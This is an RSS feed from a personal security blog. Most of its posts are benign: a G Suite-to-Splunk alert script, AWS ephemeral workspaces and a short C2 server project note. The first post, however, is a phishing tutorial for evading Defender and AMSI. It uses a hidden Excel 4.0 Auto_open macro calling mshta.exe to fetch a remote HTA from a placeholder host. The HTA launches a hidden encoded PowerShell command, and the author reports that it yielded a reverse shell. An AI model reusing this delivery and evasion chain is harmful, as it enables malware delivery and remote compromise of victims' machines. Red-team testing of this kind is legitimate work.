<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on Christopher Alonso</title>
        <link>https://christopherja.rocks/posts/</link>
        <description>Recent content in Posts on Christopher Alonso</description>
        <generator>Hugo -- gohugo.io</generator>
        <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
        <lastBuildDate>Tue, 25 Feb 2020 13:07:25 -0500</lastBuildDate>
        <atom:link href="https://christopherja.rocks/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>Phishing AMSI Bypass</title>
            <link>https://christopherja.rocks/posts/2020/02/phishing-amsi-bypass/</link>
            <pubDate>Tue, 25 Feb 2020 13:07:25 -0500</pubDate>
            
            <guid>https://christopherja.rocks/posts/2020/02/phishing-amsi-bypass/</guid>
            <description>How to bypass AMSI (The Simplest Way) I was looking to run my own phishing campaigns on my current organization and was testing office document payloads. I tried the old fashioned VBA in the macro running the shell function as well as some others, and defender caught most if not all of them. Using this tool Macro-Pack works sometimes but often, it would get flagged or the powershell command would not properly run.</description>
            <content type="html"><![CDATA[<h2 id="how-to-bypass-amsi-the-simplest-way">How to bypass AMSI (The Simplest Way)</h2>
<p>I was looking to run my own phishing campaigns on my current organization and was testing office document payloads.
I tried the old fashioned VBA in the macro running the shell function as well as some others, and defender caught most if not all of them.
Using this tool <a href="https://github.com/sevagas/macro_pack">Macro-Pack</a> works sometimes but often, it would get flagged or the powershell command would not properly run.
I noticed that most of the issues i was running into was this AMSI popup <img src="/popup.png" alt="asmi popup"></p>
<p>So i began researching AMSI as i never heard of it. The following resources break down AMSI and bypass options.</p>
<ul>
<li><a href="https://outflank.nl/blog/2019/04/17/bypassing-amsi-for-vba/">Outflank</a></li>
<li><a href="https://medium.com/@byte_St0rm/adventures-in-the-wonderful-world-of-amsi-25d235eb749c">byte storm</a></li>
<li><a href="https://security-soup.net/flawedammyy-rat-excel-4-0-macros/">security soup</a></li>
<li><a href="https://outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm/">OutFlank2</a></li>
</ul>
<p>The first two explain what AMSI is and the last two go into the easier ways to bypass it. Security-Soup broke down how some actors bypassed it using excel 4.0 macros.
Aka really old macros that still work. I used the following link to get more familiar with these macros.<a href="https://exceloffthegrid.com/using-excel-4-macro-functions/">Excel Off The Grid</a>.
I pretty much right clicked my sheet. And clicked Excel 4.0 macro. This creates a new sheet called macro1. If you rename the first cell Auto_open it will run the sheet cell by cell. Dont forget to hide the sheet after this lol. You can run pretty much anything with the following function.</p>
<pre><code>=EXEC(&quot;cmd.exe&quot;)
</code></pre><p>The issue i was running into at this point was not AMSI it was defender flagging certain lolbins like certil for example.
So i decide to look for lolbins that could potentially bypass defender since AMSI was taken care of. I came across a post here on <a href="https://ironhackers.es/en/cheatsheet/comandos-en-windows-para-obtener-shell/">IronHackers</a>
That pretty much goes through alot of lolbins but what i noticed was they mentioned that. Mshta.exe doesnt get flagged.</p>
<p>So i found an HTA payload which contained some jscript and tried injecting that into my exec function. The macro1 sheet now looks like this</p>
<pre><code>=EXEC(&quot;mshta.exe http://someip/evil.hta&quot;)
</code></pre><p>The HTA file looks like this</p>
<pre><code>&lt;html&gt;
&lt;head&gt;
&lt;HTA:APPLICATION id=&quot;hwHTA&quot;
applicationName=&quot;hyperHTA&quot;
border=&quot;thin&quot;
borderStyle=&quot;normal&quot;
caption=&quot;yes&quot;
icon=&quot;http://www.hyperwrite.com/features/favicon.ico&quot;
maximizeButton=&quot;yes&quot;
minimizeButton=&quot;yes&quot;
showInTaskbar=&quot;no&quot;
windowState=&quot;normal&quot;
innerBorder=&quot;yes&quot;
navigable=&quot;yes&quot;
scroll=&quot;auto&quot;
scrollFlat=&quot;yes&quot;
singleInstance=&quot;yes&quot; 
sysMenu=&quot;yes&quot;
contextMenu=&quot;yes&quot;
selection=&quot;yes&quot; 
version=&quot;1.0&quot; /&gt;

&lt;script&gt;
a=new ActiveXObject(&quot;WScript.Shell&quot;);
a.run(&quot;powershell -encodedCommand safdjngnrwgnwfn Blah blah blah&quot;,0,false);window.close();
&lt;/script&gt;

&lt;title&gt;Simple HTML Page&lt;/title&gt;

&lt;/head&gt;

&lt;body&gt;

&lt;h1&gt;Dummy Page&lt;/h1&gt;
&lt;hr&gt;
&lt;p&gt;This is a simple, common or garden variety, normal HTML page. Oh, but saved
with a .HTA extension, and with an &amp;lt;HTA&amp;gt; application block included at the
top of the HTML code. &lt;/p&gt;
&lt;p&gt;And to make it interesting, here is a link to the &lt;a href=&quot;http://www.aodc.com.au/&quot; target=&quot;_top&quot;&gt;AODC
Web site&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;And why not retrieve the version number out of the HTA:Application properties
using &lt;a href=&quot;#&quot; onClick=&quot;JavaScript:alert('Version of this HTA is ' + hwHTA.version)&quot;&gt;JavaScript&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;

&lt;/body&gt;

&lt;/html&gt;
</code></pre><p>Im not very savy to Jscript or VB so i found this online entered my own powershell encoded command into it.
And to my surprise it did not trigger defender and my reverse shell came in soon after. So with just using an old school method found with soome googling and leveraging mshta.exe you too can bypass defender as well as AMSI to get code execution.</p>
<h2 id="how-to-bypass-amsi-the-harder-way">How to bypass AMSI (The Harder Way)</h2>
<h3 id="but-its-more-flexible-and-in-depth">but its more flexible and in depth</h3>
<p>===&gt; <a href="https://medium.com/@fsx30/excel-4-0-macro-old-but-new-967071106be9">Hoang Bui&rsquo;s Blog</a></p>
<h2 id="coming-soon">Coming soon</h2>
<h3 id="macos-phishing-tactics">MacOS phishing tactics</h3>
]]></content>
        </item>
        
        <item>
            <title>Splunk-G-Suite-Python-App</title>
            <link>https://christopherja.rocks/posts/2020/02/splunk-g-suite-python-app/</link>
            <pubDate>Sun, 02 Feb 2020 13:05:45 -0500</pubDate>
            
            <guid>https://christopherja.rocks/posts/2020/02/splunk-g-suite-python-app/</guid>
            <description>Ingesting G Suite Alert Center Logs Into Splunk I was recently tasked with ingesting alot of data from various cloud platforms like AWS &amp;amp; GCP into splunk. Splunk provides very good documentation and provides add-ons for both of these platforms. However for G-Suite (which is like 0365 but for google) There seems to be one app that is used and actually works very well. G Suite App Kyle Smith wrote it.</description>
            <content type="html"><![CDATA[<h2 id="ingesting-g-suite-alert-center-logs-into-splunk">Ingesting G Suite Alert Center Logs Into Splunk</h2>
<p>I was recently tasked with ingesting alot of data from various cloud platforms like AWS &amp; GCP into splunk.
Splunk provides very good documentation and provides add-ons for both of these platforms. However for G-Suite (which is like 0365 but for google) There seems to be one app that is used and actually works very well. <a href="https://splunkbase.splunk.com/app/3791/#/details">G Suite App</a> <a href="https://splunkbase.splunk.com/apps/#/author/alacercogitatus">Kyle Smith wrote it</a>.</p>
<p>It has logging options for most apps in G Suite. (you can literally see every log from drive) After setting it up i realized that i really didnt need to see all that stuff and instead opted to look for an option regarding the <a href="https://support.google.com/a/answer/9105393?hl=en&amp;ref_topic=9105077">G Suite Alert Center</a></p>
<p>At this point i was happy with the alerts triggered. Since it will alert on DLP rules as well as sus logins or sus emails.
Also you can create custom alerts based on rules set up <a href="https://support.google.com/analytics/answer/1033021?hl=en">using that investigation center gui</a>. It gives you options to create different rules based on the logs its constantly looking at if that makes sense. Unfortunately at the time and still (i think) the g suite app doesnt support the alert center logs. So i sought out a way to ingest those using the Splunk HEC.</p>
<p>Searching online i couldnt find much in this topic/issue. So i contacted google and asked about this <a href="https://developers.google.com/admin-sdk/alertcenter/guides">article</a>.
The quickstart guide is in java. I asked if they had any way to do this in python or another language. The support rep told me there was NO way to do this in another language&hellip;Ok.</p>
<p>Searching google i was able to find a <a href="https://developers.google.com/resources/api-libraries/documentation/alertcenter/v1beta1/python/latest/alertcenter_v1beta1.alerts.html">reference</a> to the api. So i started writing something to query it for latest alerts.
the hardest part was finding the syntax for the initial build function that is provided by the google library. I found a post that had the correct syntax and i was finally able to query it <a href="https://github.com/googleapis/google-api-python-client/issues/777">here</a>.
Before this obviously you need to set up the proper credentials the article for those steps are <a href="https://developers.google.com/identity/protocols/oauth2/service-account">here</a> Specifically the &ldquo;Delegating domain-wide authority to the service account&rdquo; section.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">scopes <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;https://www.googleapis.com/auth/apps.alerts&#34;</span>]
SERVICE_ACCOUNT_FILE <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;json creds&#39;</span>
credentials <span style="color:#f92672">=</span> service_account<span style="color:#f92672">.</span>Credentials<span style="color:#f92672">.</span>from_service_account_file(SERVICE_ACCOUNT_FILE, subject<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;acount here&#34;</span>, scopes<span style="color:#f92672">=</span>scopes)
service <span style="color:#f92672">=</span> build(<span style="color:#e6db74">&#39;alertcenter&#39;</span>, <span style="color:#e6db74">&#39;v1beta1&#39;</span>, credentials<span style="color:#f92672">=</span>credentials)<span style="color:#f92672">.</span>alerts()

</code></pre></div><p>After getting the initial auth squared away, i was able to focus on getting the queries i wanted. I decided i would loop it to check every minute for a new alert in the past minute this <a href="https://developers.google.com/admin-sdk/alertcenter/reference/filter-fields.html">page</a> helped with the queries needed to filter alerts. Once the timestamp and query format was correct i just practiced with the sending of the data to slunk wich is a straight forward post request. I added this to a linux server as a service with SystemD
And it hasnt failed me yet or missed an alert.</p>
<p>Here is the end result once in splunk.</p>
<p><img src="/gsuite.png" alt="asmi popup"></p>
<p>This could probably be added to the current G Suite App or made even better. But this was my way to work through the problem.
<a href="https://github.com/latortuga71/GSuiteAlerts2Splunk">The Repo</a></p>
<p>The Code Below</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> json
<span style="color:#f92672">from</span> googleapiclient.discovery <span style="color:#f92672">import</span> build
<span style="color:#f92672">from</span> google_auth_oauthlib.flow <span style="color:#f92672">import</span> InstalledAppFlow
<span style="color:#f92672">from</span> google.auth.transport.requests <span style="color:#f92672">import</span> Request
<span style="color:#f92672">from</span> google.oauth2 <span style="color:#f92672">import</span> service_account
<span style="color:#f92672">import</span> requests
<span style="color:#f92672">import</span> datetime
<span style="color:#f92672">from</span> sys <span style="color:#f92672">import</span> exit
<span style="color:#f92672">from</span> time <span style="color:#f92672">import</span> sleep
<span style="color:#f92672">import</span> logging

logging<span style="color:#f92672">.</span>basicConfig(filename<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;/opt/gsuite-alerts.log&#39;</span>,level<span style="color:#f92672">=</span>logging<span style="color:#f92672">.</span>INFO)

<span style="color:#e6db74">&#39;&#39;&#39;
</span><span style="color:#e6db74">	    scopes = [&#34;https://www.googleapis.com/auth/apps.alerts&#34;]
</span><span style="color:#e6db74">	    SERVICE_ACCOUNT_FILE = &#39;json creds&#39;
</span><span style="color:#e6db74">	    credentials = service_account.Credentials.from_service_account_file(SERVICE_ACCOUNT_FILE, subject=&#34;acount here&#34;, scopes=scopes)
</span><span style="color:#e6db74">	    service = build(&#39;alertcenter&#39;, &#39;v1beta1&#39;, credentials=credentials).alerts()
</span><span style="color:#e6db74">&#39;&#39;&#39;</span>

<span style="color:#75715e">#recent_alerts = service.list().execute().get(&#34;alerts&#34;, [])</span>
<span style="color:#75715e">#https://developers.google.com/resources/api-libraries/documentation/alertcenter/v1beta1/python/latest/alertcenter_v1beta1.alerts.html#list</span>
<span style="color:#75715e">#https://developers.google.com/admin-sdk/alertcenter/reference/filter-fields.html</span>
<span style="color:#75715e">#https://github.com/googleapis/google-api-python-client/issues/777</span>
<span style="color:#75715e">#filter = &#34;createTime &gt;= \&#34;2018-04-05T00:00:00Z\&#34;&#34;</span>
<span style="color:#75715e"># FILTER NEEDS TO BE IN STRING FORMAT THE WHOLE THING ESCAPE DOUBLE QUOTES</span>


<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">AlertAPI</span>(object):
	alert_id <span style="color:#f92672">=</span> None
	scopes <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;https://www.googleapis.com/auth/apps.alerts&#34;</span>]
	SERVICE_ACCOUNT_FILE <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;appcreds.json&#39;</span>
	credentials <span style="color:#f92672">=</span> service_account<span style="color:#f92672">.</span>Credentials<span style="color:#f92672">.</span>from_service_account_file(SERVICE_ACCOUNT_FILE, subject<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;account here&#34;</span>, scopes<span style="color:#f92672">=</span>scopes)
	<span style="color:#75715e">#service = build(&#39;alertcenter&#39;, &#39;v1beta1&#39;, credentials=credentials).alerts()</span>



	<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">check_new_alerts</span>(self):
		self<span style="color:#f92672">.</span>service <span style="color:#f92672">=</span> build(<span style="color:#e6db74">&#39;alertcenter&#39;</span>, <span style="color:#e6db74">&#39;v1beta1&#39;</span>, credentials<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>credentials)<span style="color:#f92672">.</span>alerts()
		self<span style="color:#f92672">.</span>one_min_behind <span style="color:#f92672">=</span> datetime<span style="color:#f92672">.</span>datetime<span style="color:#f92672">.</span>utcnow() <span style="color:#f92672">-</span> datetime<span style="color:#f92672">.</span>timedelta(minutes<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>)
		self<span style="color:#f92672">.</span>now <span style="color:#f92672">=</span> datetime<span style="color:#f92672">.</span>datetime<span style="color:#f92672">.</span>utcnow()
		self<span style="color:#f92672">.</span>time_filter_str1 <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>one_min_behind<span style="color:#f92672">.</span>isoformat()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;.&#34;</span>)[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;Z&#34;</span>
		self<span style="color:#f92672">.</span>time_filter_str2 <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>now<span style="color:#f92672">.</span>isoformat()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;.&#34;</span>)[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;Z&#34;</span>
		self<span style="color:#f92672">.</span>final_filter <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;createTime &gt;= </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">{}</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> AND createTime &lt; </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">{}</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> &#34;</span><span style="color:#f92672">.</span>format(self<span style="color:#f92672">.</span>time_filter_str1,self<span style="color:#f92672">.</span>time_filter_str2)
		logging<span style="color:#f92672">.</span>info(self<span style="color:#f92672">.</span>final_filter)
		orderfilter <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;create_time asc&#34;</span>
		self<span style="color:#f92672">.</span>recent_alerts <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>service<span style="color:#f92672">.</span>list(orderBy<span style="color:#f92672">=</span>orderfilter,filter<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>final_filter)<span style="color:#f92672">.</span>execute() <span style="color:#75715e">#pageSize=2 filter=self.final_filter OR type=\&#34;*\&#34;</span>
		<span style="color:#75715e">#print(self.recent_alerts)</span>
		<span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> self<span style="color:#f92672">.</span>recent_alerts:
			<span style="color:#75715e"># write this to a log file eventually</span>
			<span style="color:#75715e">#print(self.recent_alerts)</span>
			self<span style="color:#f92672">.</span>num_of_alerts <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
		<span style="color:#66d9ef">else</span>:
			self<span style="color:#f92672">.</span>num_of_alerts <span style="color:#f92672">=</span> len(self<span style="color:#f92672">.</span>recent_alerts[<span style="color:#e6db74">&#39;alerts&#39;</span>])
			logging<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Alerts found =&gt; {}&#34;</span><span style="color:#f92672">.</span>format(self<span style="color:#f92672">.</span>num_of_alerts))
			logging<span style="color:#f92672">.</span>info(self<span style="color:#f92672">.</span>recent_alerts)



	<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">post_to_splunk</span>(self,payload):
		self<span style="color:#f92672">.</span>ready2post <span style="color:#f92672">=</span> {}
		self<span style="color:#f92672">.</span>ready2post[<span style="color:#e6db74">&#39;sourcetype&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;gsuite_alerts_api&#34;</span>
		self<span style="color:#f92672">.</span>ready2post[<span style="color:#e6db74">&#39;event&#39;</span>] <span style="color:#f92672">=</span> payload
		self<span style="color:#f92672">.</span>finalpayload <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>dumps(self<span style="color:#f92672">.</span>ready2post,indent<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>)
		self<span style="color:#f92672">.</span>headers <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;Authorization&#34;</span>:<span style="color:#e6db74">&#34;Splunk tokenhere &#34;</span>,
						<span style="color:#e6db74">&#34;Content-type&#34;</span>:<span style="color:#e6db74">&#34;application/json&#34;</span>}
		resp <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(<span style="color:#e6db74">&#34;splunk hec url&#34;</span>,headers<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>headers,data<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>finalpayload)
		logging<span style="color:#f92672">.</span>info(resp)
		logging<span style="color:#f92672">.</span>info(resp<span style="color:#f92672">.</span>text)
		resp_dict <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>loads(resp<span style="color:#f92672">.</span>text)
		<span style="color:#66d9ef">if</span> resp_dict[<span style="color:#e6db74">&#39;text&#39;</span>] <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;Success&#34;</span>:
			logging<span style="color:#f92672">.</span>warning(<span style="color:#e6db74">&#34;Failed Posting to splunk&#34;</span>)
		<span style="color:#66d9ef">else</span>:
			logging<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Successfully Posted to splunk&#34;</span>)




	<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>(self):
		<span style="color:#66d9ef">while</span> True:
		    <span style="color:#75715e">#self.check_new_alerts()</span>
		    <span style="color:#66d9ef">try</span>:
		    	self<span style="color:#f92672">.</span>check_new_alerts()
		    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
		    	logging<span style="color:#f92672">.</span>warning(<span style="color:#e6db74">&#34;ERROR {}&#34;</span><span style="color:#f92672">.</span>format(e))
		    	sleep(<span style="color:#ae81ff">60</span>)
		    	<span style="color:#66d9ef">continue</span>

		    <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>num_of_alerts <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
		    	logging<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;No Alerts Found!&#34;</span>)
		    	sleep(<span style="color:#ae81ff">60</span>)
		    	<span style="color:#66d9ef">continue</span>
		    <span style="color:#66d9ef">else</span>:
		    	<span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>recent_alerts[<span style="color:#e6db74">&#39;alerts&#39;</span>][<span style="color:#ae81ff">0</span>][<span style="color:#e6db74">&#39;alertId&#39;</span>] <span style="color:#f92672">==</span> self<span style="color:#f92672">.</span>alert_id:
		    		logging<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Last Alert Posted ID is same as oldest pulled alert...&#34;</span>)
		    		logging<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Continue to top of loop until this is resolved&#34;</span>)
		    		sleep(<span style="color:#ae81ff">60</span>)
		    		<span style="color:#66d9ef">continue</span>

		    	<span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,self<span style="color:#f92672">.</span>num_of_alerts):
		    		<span style="color:#75715e">#print(x)</span>
		    		self<span style="color:#f92672">.</span>post_to_splunk(self<span style="color:#f92672">.</span>recent_alerts[<span style="color:#e6db74">&#39;alerts&#39;</span>][x])
		    		<span style="color:#66d9ef">if</span> x <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">==</span> self<span style="color:#f92672">.</span>num_of_alerts:
		    			logging<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;attemping to get last alerts alert id&#34;</span>)
		    			self<span style="color:#f92672">.</span>alert_id <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>recent_alerts[<span style="color:#e6db74">&#39;alerts&#39;</span>][x][<span style="color:#e6db74">&#39;alertId&#39;</span>]
		    logging<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;below is last alerts alert id&#34;</span>)
		    logging<span style="color:#f92672">.</span>info(self<span style="color:#f92672">.</span>alert_id)
		    logging<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;done sleeping running loop again... checking for new alerts&#34;</span>)
		    sleep(<span style="color:#ae81ff">60</span>)


<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
    AlertAPI()<span style="color:#f92672">.</span>main()

</code></pre></div>]]></content>
        </item>
        
        <item>
            <title>AWS Ephemeral Workspaces</title>
            <link>https://christopherja.rocks/posts/2020/01/aws-ephemeral-workspaces/</link>
            <pubDate>Wed, 15 Jan 2020 13:05:45 -0500</pubDate>
            
            <guid>https://christopherja.rocks/posts/2020/01/aws-ephemeral-workspaces/</guid>
            <description>AWS doesnt offer ephemeral workspaces at this point in time. So i was tasked with finding a solution and seeing if this was possible. Searching online i didnt find much. But i did find a way to work through this problem. Using lambda functions, Cloud Watch , Cloud Trail &amp;amp;Workspaces of course.
In my repo i have a pdf explaining how it works (hopefully well) its basically three lambda functions. One function triggers when a new workspace is created, and creates a cloud watch rule on it to see if it disconnects or logs off.</description>
            <content type="html"><![CDATA[<p>AWS doesnt offer ephemeral workspaces at this point in time. So i was tasked with finding a solution and seeing if this was possible. Searching online i didnt find much. But i did find a way to work through this problem. Using lambda functions, Cloud Watch , Cloud Trail &amp;Workspaces of course.</p>
<p>In my repo i have a pdf explaining how it works (hopefully well) its basically three lambda functions. One function triggers when a new workspace is created, and creates a cloud watch rule on it to see if it disconnects or logs off. If it does it will trigger the rule and run the big function that tears down the workspace completely and rebuilds it from an image. And the last function watches for workspaces being terminated to delete the alert that is tied to that workspace.</p>
<p>So it pretty much is a small ecosystem of functions working upon the work of the others. Code &amp; PDF here =&gt; <a href="https://github.com/latortuga71/AWS_Ephemeral_Workspaces">Repo has PDF that explains in detail</a></p>
]]></content>
        </item>
        
        <item>
            <title>BlackTabby C2 Server</title>
            <link>https://christopherja.rocks/posts/2020/01/blacktabby-c2-server/</link>
            <pubDate>Fri, 03 Jan 2020 13:06:50 -0500</pubDate>
            
            <guid>https://christopherja.rocks/posts/2020/01/blacktabby-c2-server/</guid>
            <description>I wanted to learn more about C2 Servers, so i tried to write my own. And i was semi-successful. It works. But its not neccesarily useful for others in my opinion. I think my biggest mistake was using couch db as the database. Using sqlLite would have been better i think. I will definitely pursue this again. As it wasnt as hard as i thought and most likely will try the same formula again but with a different DB and perhaps writing the server in C (As i think it would help me get better).</description>
            <content type="html"><![CDATA[<p>I wanted to learn more about C2 Servers, so i tried to write my own. And i was semi-successful. It works. But its not neccesarily useful for others in my opinion. I think my biggest mistake was using couch db as the database. Using sqlLite would have been better i think. I will definitely pursue this again. As it wasnt as hard as i thought and most likely will try the same formula again but with a different DB and perhaps writing the server in C (As i think it would help me get better). Writing an agent in powershell and C# also helped me get into those languages a little more as well. <a href="https://github.com/latortuga71/Black_Tabby">repo</a></p>
<p><a href="https://asciinema.org/a/Cd53d45U1azyUZvlcbGdnOxDv"><img src="https://asciinema.org/a/Cd53d45U1azyUZvlcbGdnOxDv.svg" alt="asciicast"></a></p>
]]></content>
        </item>
        
        <item>
            <title>Old Posts Found Here</title>
            <link>https://christopherja.rocks/posts/2020/01/old-posts-found-here/</link>
            <pubDate>Wed, 01 Jan 2020 08:53:31 -0500</pubDate>
            
            <guid>https://christopherja.rocks/posts/2020/01/old-posts-found-here/</guid>
            <description>Check out my OldSite that contains all my old posts.</description>
            <content type="html"><![CDATA[<p>Check out my <a href="http://chrisja.info">OldSite</a> that contains all my old posts.</p>
]]></content>
        </item>
        
    </channel>
</rss>
